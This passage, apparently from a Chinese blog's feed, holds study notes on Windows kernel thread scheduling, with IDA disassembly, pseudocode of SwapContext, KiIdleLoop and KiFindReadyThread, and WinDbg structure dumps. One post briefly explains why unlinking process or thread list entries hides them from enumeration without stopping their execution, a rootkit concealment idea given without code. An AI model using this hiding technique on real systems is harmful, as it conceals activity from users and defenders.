class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v8 = NextThread-&gt;ApcState.Process;</span><br><span class="line">v9 = CurrentThread-&gt;ApcState.Process;</span><br><span class="line"><span class="keyword">if</span> ( v8 != v9 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    __writecr3(v8-&gt;DirectoryTableBase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将当前线程的 TEB 保存到了段选择子为 <code>0x3b</code>（<code>gdt[7]</code>） 的段上，这个值是 <code>R3</code> 在 <code>fs</code> 所指示的段的基址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Teb = (_NT_TIB *)NextThread-&gt;Teb;</span><br><span class="line">PCR-&gt;NtTib.Self = Teb;</span><br><span class="line">_GDT = PCR-&gt;GDT;</span><br><span class="line">_GDT[<span class="number">7</span>].BaseLow = (<span class="type">unsigned</span> __int16)Teb;</span><br><span class="line">Teb = (_NT_TIB *)((<span class="type">unsigned</span> <span class="type">int</span>)Teb &gt;&gt; <span class="number">16</span>);</span><br><span class="line">_GDT[<span class="number">7</span>].HighWord.Bytes.BaseMid = (<span class="type">unsigned</span> __int8)Teb;</span><br><span class="line">_GDT[<span class="number">7</span>].HighWord.Bytes.BaseHi = BYTE1(Teb);</span><br><span class="line">++NextThread-&gt;ContextSwitches;</span><br></pre></td></tr></table></figure><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><p>从伪代码似乎只能分析得到这么多了，由于 IDA 很难处理类似堆栈切换的函数，所以剩余的逻辑需要分析汇编语句，从伪代码 <code>CurrentThread-&gt;KernelStack = &amp;ExceptionList;</code> 处开始分析，其中，<code>edi</code> 指向了 <code>CurrentThread</code>，<code>esi</code> 指向了 <code>NextThread</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00458FDE                         loc_458FDE:                             ; CODE XREF: SwapContext()+63↑j</span><br><span class="line">.text:00458FDE 89 67 30                                mov     [edi+30h], esp</span><br><span class="line">.text:00458FE1 8B 46 28                                mov     eax, [esi+28h]</span><br><span class="line">.text:00458FE4 8B 66 30                                mov     esp, [esi+30h]</span><br><span class="line">.text:00458FE7 8B 8E 50 01 00 00                       mov     ecx, [esi+150h]</span><br><span class="line">.text:00458FED 3B 8F 50 01 00 00                       cmp     ecx, [edi+150h]</span><br><span class="line">.text:00458FF3 74 05                                   jz      short loc_458FFA</span><br></pre></td></tr></table></figure><p>这里给出 <code>KTHREAD</code> 参考</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x150</span> Process          : Ptr32 _KPROCESS</span><br></pre></td></tr></table></figure><p>所以这段代码很明显就是，将当前 <code>esp</code> 的值保存到 <code>CurrentThread-&gt;KernelStack</code>，从 <code>NextThread-&gt;KernelStack</code> 取出值赋给 <code>esp</code>。</p><hr><p>中断门提权的时候，要取得保存在 <code>TSS</code> 中的 <code>esp0</code>，既然一个核只有一个 <code>TSS</code>，那么在切换线程的时候必然要把 <code>NextThread</code> 的 <code>esp</code> 给到 <code>TSS</code>，不然这个线程从中断门提权过来就会进入别的线程的栈。相关代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00459033                         loc_459033:                             ; CODE XREF: SwapContext()+DE↑j</span><br><span class="line">.text:00459033 8B 53 0C                                mov     edx, [ebx+0Ch]</span><br><span class="line">.text:00459036 89 42 04                                mov     [edx+4], eax</span><br><span class="line">.text:00459039 8B 53 0C                                mov     edx, [ebx+0Ch]</span><br><span class="line">.text:0045903C 66 8B 45 6E                             mov     ax, [ebp+6Eh]</span><br><span class="line">.text:00459040 66 89 42 66                             mov     [edx+66h], ax</span><br><span class="line">.text:00459044 F7 05 C4 2F 53 00 04 00                 test    ds:dword_532FC4, 4</span><br><span class="line">.text:00459044 00 00</span><br><span class="line">.text:0045904E 0F 85 0F 01 00 00                       jnz     loc_459163</span><br></pre></td></tr></table></figure><p>其中 <code>ebx+0xC</code> 刚好是 <code>KPCR.TssCopy</code> 其值与 <code>KPCR.TSS</code> 一致。在此地下一个断点，看看 <code>esp</code> 是否会在这里改变。</p><img src="/2025/01/25/WindowsProcess4/1.png" class=""><p>可以看出，在这个地方的确是将 <code>esp</code> 的值存入了 <code>Tss.esp0</code> 中，至于为什么没有存 <code>ss0</code>，大概是因为 <code>Tss</code> 只会在线程切换的时候修改，而线程切换都是在 <code>r0</code> 去做的，因此 <code>ss0==0x10</code> 恒成立。且仔细观察可以得知，该 <code>Tss</code> 似乎只有 <code>esp0</code> 和 <code>ss0</code> 两个字段上有值，其余值全为 0。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>线程切换的时候，会做如下操作：</p><ol><li>保存 ExceptionList</li><li>切换 esp</li><li>判断目标线程与当前线程是否属于同一进程，如果不属于则切换 CR3</li><li>将当前线程的 esp0 写入 Tss 寄存器</li><li>根据当前线程的 PEB 写入段选择子为 0x3b 的描述符表。</li></ol><h2 id="空闲线程分析"><a href="#空闲线程分析" class="headerlink" title="空闲线程分析"></a>空闲线程分析</h2><p>空闲线程即<strong>IdleThread</strong>，当CPU空闲的时候会执行这个线程，可以直接通过 KPCR 结构找到该线程，并观察它所执行的代码。</p><img src="/2025/01/25/WindowsProcess4/2.png" class=""><p>去 IDA 里面查看这个函数，可以发现就是做一些无意义的指令，让 CPU 别闲下来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">text:004594B0                         @KiIdleLoop@0   proc near               ; CODE XREF: KiSystemStartup(x)+20B↓j</span><br><span class="line">.text:004594B0                                                                 ; DATA XREF: KiInitializeThread(x,x,x,x)+14↑o ...</span><br><span class="line">.text:004594B0 EB 0B                                   jmp     short loc_4594BD</span><br><span class="line">.text:004594B2                         ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004594B2</span><br><span class="line">.text:004594B2                         loc_4594B2:                             ; CODE XREF: KiIdleLoop()+ED↓j</span><br><span class="line">.text:004594B2 8D 8B 20 01 00 00                       lea     ecx, [ebx+120h]</span><br><span class="line">.text:004594B8 E8 5D 24 00 00                          call    @PoIdle@4       ; PoIdle(x)</span><br><span class="line">.text:004594BD</span><br><span class="line">.text:004594BD                         loc_4594BD:                             ; CODE XREF: KiIdleLoop()↑j</span><br><span class="line">.text:004594BD                                                                 ; KiIdleLoop()+CE↓j ...</span><br><span class="line">.text:004594BD 80 3D 29 5A 56 00 00                    cmp     ds:_HvlEnableIdleYield, 0</span><br><span class="line">.text:004594C4 74 02                                   jz      short loc_4594C8</span><br><span class="line">.text:004594C6 F3 90                                   pause</span><br><span class="line">.text:004594C8</span><br><span class="line">.text:004594C8                         loc_4594C8:                             ; CODE XREF: KiIdleLoop()+14↑j</span><br><span class="line">.text:004594C8 FB                                      sti</span><br><span class="line">.text:004594C9 90                                      nop</span><br><span class="line">.text:004594CA 90                                      nop</span><br><span class="line">.text:004594CB FA                                      cli</span><br><span class="line">.text:004594CC F6 83 54 1A 00 00 3F                    test    byte ptr [ebx+1A54h], 3Fh</span><br><span class="line">.text:004594D3 74 13                                   jz      short loc_4594E8</span><br><span class="line">.text:004594D5 B1 02                                   mov     cl, 2</span><br><span class="line">.text:004594D7 FF 15 A8 10 40 00                       call    ds:__imp_@HalClearSoftwareInterrupt@4 ; HalClearSoftwareInterrupt(x)</span><br><span class="line">.text:004594DD 8D 8B 20 01 00 00                       lea     ecx, [ebx+120h]</span><br><span class="line">.text:004594E3 E8 0B 01 00 00                          call    @KiRetireDpcList@4 ; KiRetireDpcList(x)</span><br><span class="line">.text:004594E8</span><br><span class="line">.text:004594E8                         loc_4594E8:                             ; CODE XREF: KiIdleLoop()+23↑j</span><br><span class="line">.text:004594E8 83 BB 28 01 00 00 00                    cmp     dword ptr [ebx+128h], 0</span><br><span class="line">.text:004594EF 0F 84 A1 00 00 00                       jz      loc_459596</span><br><span class="line">.text:004594F5 FB                                      sti</span><br><span class="line">.text:004594F6 8B BB 24 01 00 00                       mov     edi, [ebx+124h]</span><br><span class="line">.text:004594FC F0 0F BA AB 3C 1A 00 00                 lock bts dword ptr [ebx+1A3Ch], 0</span><br><span class="line">.text:004594FC 00</span><br><span class="line">.text:00459505 73 0D                                   jnb     short loc_459514</span><br><span class="line">.text:00459507 8D 8B 3C 1A 00 00                       lea     ecx, [ebx+1A3Ch] ; SpinLock</span><br><span class="line">.text:0045950D E8 CE 03 00 00                          call    @KefAcquireSpinLockAtDpcLevel@4 ; KefAcquireSpinLockAtDpcLevel(x)</span><br><span class="line">.text:00459512 EB 07                                   jmp     short loc_45951B</span><br><span class="line">.text:00459514                         ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00459514</span><br><span class="line">.text:00459514                         loc_459514:                             ; CODE XREF: KiIdleLoop()+55↑j</span><br><span class="line">.text:00459514 64 FF 05 80 36 00 00                    inc     large dword ptr fs:3680h</span><br><span class="line">.text:0045951B</span><br><span class="line">.text:0045951B                         loc_45951B:                             ; CODE XREF: KiIdleLoop()+62↑j</span><br><span class="line">.text:0045951B 8B B3 28 01 00 00                       mov     esi, [ebx+128h]</span><br><span class="line">.text:00459521 3B F7                                   cmp     esi, edi</span><br><span class="line">.text:00459523 74 5E                                   jz      short loc_459583</span><br><span class="line">.text:00459525 83 A3 28 01 00 00 00                    and     dword ptr [ebx+128h], 0</span><br><span class="line">.text:0045952C FA                                      cli</span><br><span class="line">.text:0045952D 0F 31                                   rdtsc</span><br><span class="line">.text:0045952F 2B 83 18 33 00 00                       sub     eax, [ebx+3318h]</span><br><span class="line">.text:00459535 1B 93 1C 33 00 00                       sbb     edx, [ebx+331Ch]</span><br><span class="line">.text:0045953B 8B 4F 10                                mov     ecx, [edi+10h]</span><br><span class="line">.text:0045953E 03 C8                                   add     ecx, eax</span><br><span class="line">.text:00459540 11 57 18                                adc     [edi+18h], edx</span><br><span class="line">.text:00459543 01 47 10                                add     [edi+10h], eax</span><br><span class="line">.text:00459546 11 57 14                                adc     [edi+14h], edx</span><br><span class="line">.text:00459549 01 83 18 33 00 00                       add     [ebx+3318h], eax</span><br><span class="line">.text:0045954F 11 93 1C 33 00 00                       adc     [ebx+331Ch], edx</span><br><span class="line">.text:00459555 FB                                      sti</span><br><span class="line">.text:00459556 FE 83 31 01 00 00                       inc     byte ptr [ebx+131h]</span><br><span class="line">.text:0045955C 89 B3 24 01 00 00                       mov     [ebx+124h], esi</span><br><span class="line">.text:00459562 C6 46 68 02                             mov     byte ptr [esi+68h], 2</span><br><span class="line">.text:00459566 80 A3 53 1A 00 00 00                    and     byte ptr [ebx+1A53h], 0</span><br><span class="line">.text:0045956D 83 A3 3C 1A 00 00 00                    and     dword ptr [ebx+1A3Ch], 0</span><br><span class="line">.text:00459574</span><br><span class="line">.text:00459574                         loc_459574:                             ; CODE XREF: KiIdleLoop()+109↓j</span><br><span class="line">.text:00459574 B9 01 00 00 00                          mov     ecx, 1</span><br><span class="line">.text:00459579 E8 D2 F9 FF FF                          call    _SwapContext@0  ; SwapContext()</span><br><span class="line">.text:0045957E E9 3A FF FF FF                          jmp     loc_4594BD</span><br></pre></td></tr></table></figure><h2 id="KiFindReadyThread"><a href="#KiFindReadyThread" class="headerlink" title="KiFindReadyThread"></a>KiFindReadyThread</h2><p>该函数用于寻找一个就绪态的线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_KTHREAD *__userpurge KiFindReadyThread@&lt;eax&gt;(<span class="type">unsigned</span> <span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2, _KPRCB *PrcbData)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">    _LIST_ENTRY *v5; <span class="comment">// edi</span></span><br><span class="line">    _LIST_ENTRY *Flink; <span class="comment">// ecx</span></span><br><span class="line">    _KTHREAD *thread; <span class="comment">// eax</span></span><br><span class="line">    _LIST_ENTRY *v8; <span class="comment">// edx</span></span><br><span class="line">    _LIST_ENTRY *Blink; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        _BitScanReverse(&amp;v4, a1);</span><br><span class="line">        a1 ^= KiMask32Array[v4];</span><br><span class="line">        v5 = &amp;PrcbData-&gt;DispatcherReadyListHead[v4];</span><br><span class="line">        Flink = v5-&gt;Flink;</span><br><span class="line">        v10 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            thread = (_KTHREAD *)&amp;Flink[<span class="number">-15</span>].Blink;</span><br><span class="line">            <span class="keyword">if</span> ( *(_WORD *)(a2 + <span class="number">0x3C6</span>) == <span class="built_in">LOWORD</span>(Flink[<span class="number">28</span>].Blink) &amp;&amp; (*(_DWORD *)(a2 + <span class="number">0x3C8</span>) &amp; (<span class="type">int</span>)Flink[<span class="number">28</span>].Flink) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = Flink-&gt;Flink;</span><br><span class="line">                Blink = Flink-&gt;Blink;</span><br><span class="line">                Blink-&gt;Flink = v8;</span><br><span class="line">                v8-&gt;Blink = Blink;</span><br><span class="line">                <span class="keyword">if</span> ( v8 == Blink )</span><br><span class="line">                    PrcbData-&gt;ReadySummary ^= KiMask32Array[v10];</span><br><span class="line">                thread-&gt;NextProcessor = *(_DWORD *)(a2 + <span class="number">0x3CC</span>);</span><br><span class="line">                <span class="keyword">return</span> thread;</span><br><span class="line">            &#125;</span><br><span class="line">            Flink = Flink-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( Flink != v5 );</span><br><span class="line">        <span class="keyword">if</span> ( a1 )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用一个 x86 指令 <code>bsr</code> 找到，比我想得还简单（不过据说早期的确是使用二分算法找到的），关于该指令描述如下：</p><blockquote><p>Searches the source operand (second operand) for the most significant set bit (1 bit). If a most significant 1 bit is found, its bit index is stored in the destination operand (first operand). The source operand can be a register or a memory location; the destination operand is a register. The bit index is an unsigned offset from bit 0 of the source operand. If the content source operand is 0, the content of the destination operand is undefined.<br>在源操作数（第二个操作数）中搜索最高有效设置位 （1 位）。如果找到最高有效 1 位，则其位索引将存储在目标操作数（第一个操作数）中。源操作数可以是 register 或内存位置；目标操作数是一个 register。位索引是源操作数位 0 的无符号偏移量。如果内容源操作数为 0，则目标操作数的内容未定义。</p></blockquote><p>剩余的内容，其中 <code>Flink[-15].Blink</code> 等同于 <code>Flink-0x74</code> 也就是得到 <code>_KTHREAD/_ETHREAD</code> 指针，而 <code>Flink[28].Blink</code> 和 <code>Flink[28].Flink</code> 又分别表示了 <code>EHTREAD.Affinity</code> 和 <code>ETHREAD.Process</code>。</p><p>这里无非就是判断一下当前线程能否由当前的处理器去跑，判断成功后断链该线程返回，返回之前判断一下链表是否为空，如果为空那么给对应的 <code>ReadySummary</code> 位置 <code>0</code>。</p><p>分析一遍线程切换感觉收获挺多的，突然理解了以前各种不理解的东西，后续还会继续分析线程切换相关的函数，尽量保证分析透彻，个人浅薄的见解难免有误，进请见谅。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">深入研究一下线程调度，由于篇幅较多，分章节分析</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——调度实现的学习</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess3/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess3/</id>
    <published>2025-01-24T14:00:00.000Z</published>
    <updated>2025-01-24T14:17:49.344Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下 Windows 线程调度的实现</p><span id="more"></span><p><code>Windows</code>中有一个函数<code>SwapContext</code>用来实现线程切换，我们先得了解一下什么情况下会引发线程切换。</p><h2 id="线程切换途径"><a href="#线程切换途径" class="headerlink" title="线程切换途径"></a>线程切换途径</h2><p>分<strong>主动切换</strong>和<strong>被动切换</strong>，很好理解，主动切换就是线程<strong>主动</strong>让出 CPU 执行，被动就是被打断而<strong>不得不</strong>让出 CPU。</p><p>在做实验的时候，多核真的是很困扰的一个问题，想了半天想不明白多核怎么工作的，为了好理解线程切换，建议虚拟机都换成单核的，线程大多数时候是主动切换的。</p><h3 id="主动切换"><a href="#主动切换" class="headerlink" title="主动切换"></a>主动切换</h3><p>ida 找到 <code>KeWaitForSingleObject</code> 函数，交叉引用</p><img src="/2025/01/24/WindowsProcess3/1.png" class=""><p>可以看到大量的 API 都有调用这个函数，而该函数必定会引发线程的切换。</p><p>调用链如下：</p><p><code>KeWaitForSingleObject-&gt;KiSwapThread-&gt;KiSwapContext-&gt;SwapContext</code></p><p>所以只要线程调用了相关的一些 api，那么就会主动让出 CPU。</p><h3 id="被动切换"><a href="#被动切换" class="headerlink" title="被动切换"></a>被动切换</h3><p>考虑这样一个情况：线程从不主动让出 CPU，而是死循环执行简单的指令，那么谁来打断它呢，此时 CPU 已经被线程独占了。之前有学过 CPU 中断执行的方法，一种是中断，一种是异常。异常是 CPU 主动触发的，所以能打断的方法似乎只有中断了。</p><h4 id="时钟中断"><a href="#时钟中断" class="headerlink" title="时钟中断"></a>时钟中断</h4><p>绝大部分系统内核函数都会调用<code>SwapContext</code>函数，来实现线程的切换，那么这种切换是线程主动调用的。那如果当前的线程不去调用系统<code>API</code>，操作系统如何实现线程切换呢?那就靠时钟中断了，这个是被动切换。</p><p>我们可以通过中断和异常来实现中断一个正在执行的程序。其中，时钟中断也是一种中断，中断号<code>0x30</code>，<code>Windows</code>系列操作系统为10-20毫秒。如下示意图就是对时钟中断执行时的流程示意图以供了解：</p><img src="/2025/01/24/WindowsProcess3/2.png" class=""><p>也就是说，即使你试图独占 CPU，那么再占用最多 20ms 后也会被迫交还 CPU 的控制权，除非屏蔽了中断。</p><h4 id="时间片管理"><a href="#时间片管理" class="headerlink" title="时间片管理"></a>时间片管理</h4><p>时钟中断会导致线程进行切换，但并不是说只要有时钟中断就一定会切换线程，时钟中断时，如下两种情况会导致线程切换：</p><ul><li>当前的线程<code>CPU</code>时间片到期</li><li>有备用线程：<code>KPCR.PrcbData.NextThread</code></li></ul><p>加上线程主动调用 api 切换线程，Windows 总共就有三种切换线程的方式。</p><h3 id="TSS"><a href="#TSS" class="headerlink" title="TSS"></a>TSS</h3><p>任务段寄存器，作为 Intel 被设计用于线程切换的结构，虽然 Intel 提供的线程切换方式没有被使用，但是实际操作系统切换的时候还是使用到了这个结构。</p><h3 id="FS"><a href="#FS" class="headerlink" title="FS"></a>FS</h3><p>在 R0，它指向了 KPCR 结构，在 R3，它指向了 TEB。</p><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><p>线程优先级 <code>0~31</code>，其中 <code>0~15</code> 是用户线程可以达到的级别 <code>16~31</code> 是内核线程可以达到的级别。</p><p>调度会按照优先级来判断，但是每次都判断链表表头是否为空太浪费时间，因此，当一个优先级的链表中不存在线程，那就把一个变量的对应位赋值为 0，这个变量是 <code>KPCR.PrcbData.ReadySummary</code>。</p><img src="/2025/01/24/WindowsProcess3/3.png" class=""><p>在 windbg 当中，因为中断挂起了所有线程，所以调度链表中没有线程，该值为 0。</p><p>假设 <code>ReadySummary=11</code>，那么说明优先级为 <code>0 1 3</code> 的调度链表中存在线程，其余不存在，那么就可以快速地先调度优先级为 3 的线程而不用每次都从最高优先级的链表开始一个一个找到底有没有线程。</p><p>对于一个这样的 bitmap，是有算法可以快速找到这个最高优先级的线程的。</p><p>下面是我自己想的一些方法：</p><ol><li>二分法：对于这样的数据，先判断是否大于等于 32768，如果是，那么最高优先级的非空调度链表至少为 15，否则低于15，同理可得做四次运算即可获得该值。</li><li>算术法：因为打过 acm，对一个算法有印象，就是获取最低有效位，<code>int lowbit(x)&#123;return x&amp;(-x)&#125;</code>，所以我想获取最高有效位应该也有一个合适的算法，只是我目前不知道，也没有去考究。</li></ol><p>说这个是担心想到了我最开始的想法——按从大到小的顺序判断找到第一个满足 <code>((1&lt;&lt;i)&amp;ReadySummary)!=0</code> 的链表下标。事实上就算这样，它依然比一个一个搜链表快。因为这样循环 32 次，值都可以在寄存器计算得到，而搜链表则需要最多 32 次的访存。</p><p>在多 CPU 的系统中，可以指定线程绑定某个 CPU 执行，使用 API：<code>SetThreadAffinityMask</code>，<code>Affinity</code> 在介绍 <code>ETHREAD</code> 结构时讲解过这个字段。</p><p>如果没有就绪线程，CPU也不会闲下来，它会执行一个空线程即为<code>IdleThread</code>，在 KPCR 中可以找到这个成员。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下 Windows 线程调度的实现</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——调度相关结构学习</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess2/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess2/</id>
    <published>2025-01-24T08:00:00.000Z</published>
    <updated>2025-01-24T08:54:27.279Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下调度相关的结构</p><span id="more"></span><p>很早就听说过断链隐藏的操作，因为 Windows 都是使用链表去管理进程，线程等结构的，所以断链可以达到隐藏自身的目的。那么这里就引申出来一个问题，为什么断链可以隐身且不破坏大部分的功能呢，下面的线程调度会给出答案。</p><h2 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h2><p>操作系统的一些理论，线程有三种状态：就绪（ready）、等待（wait）、运行（running）。</p><p>至于为什么进程&#x2F;线程断链可以达到隐藏且继续执行的目的，这里先给出答案：</p><ul><li>因为 CPU 调度&#x2F;执行时基于线程的，所以进程断链只会影响获取进程的 API 获取的结果而不会影响 CPU 调度。</li><li>因为 CPU 调度使用的和线程断链的链表不是同一个链表，因此线程断链也不会影响线程本身继续被 CPU 调度。</li></ul><h3 id="等待链表"><a href="#等待链表" class="headerlink" title="等待链表"></a>等待链表</h3><p>在上篇文章中讲到了线程的结构，其中有一个对象：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY</span><br><span class="line"><span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>因为它们在同一位置，所以同一时刻一个线程只能属于 <code>WaitListEntry</code> 中或者 <code>SwapListEntry</code> 中，其中等待链表是双链表结构。线程调用了<code>Sleep</code>或者<code>WaitForSingleObject</code>等函数时，就挂到一个链表之中，它是等待链表。</p><p> 似乎 Windows7 版本开始删除了该全局变量，挂在了 KPCR 结构体下，我们可以通过以下方式找到：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dg <span class="number">0x30</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0030</span> <span class="number">80</span>b97000 <span class="number">00004</span>fff Data RW Ac <span class="number">0</span> Bg By P  Nl <span class="number">000004</span>93</span><br><span class="line"></span><br><span class="line">kd&gt; dt _KPRCB <span class="number">80</span>b97000<span class="number">+0x120</span></span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="number">+0x31e0</span> WaitListHead     : _LIST_ENTRY [ <span class="number">0x884ded7c</span> - <span class="number">0x86934dbc</span> ]</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="number">+0x3220</span> DispatcherReadyListHead : [<span class="number">32</span>] _LIST_ENTRY [ <span class="number">0x868e569c</span> - <span class="number">0x868e569c</span> ]</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>先从 0x30 指示的段描述符中取得 KPCR 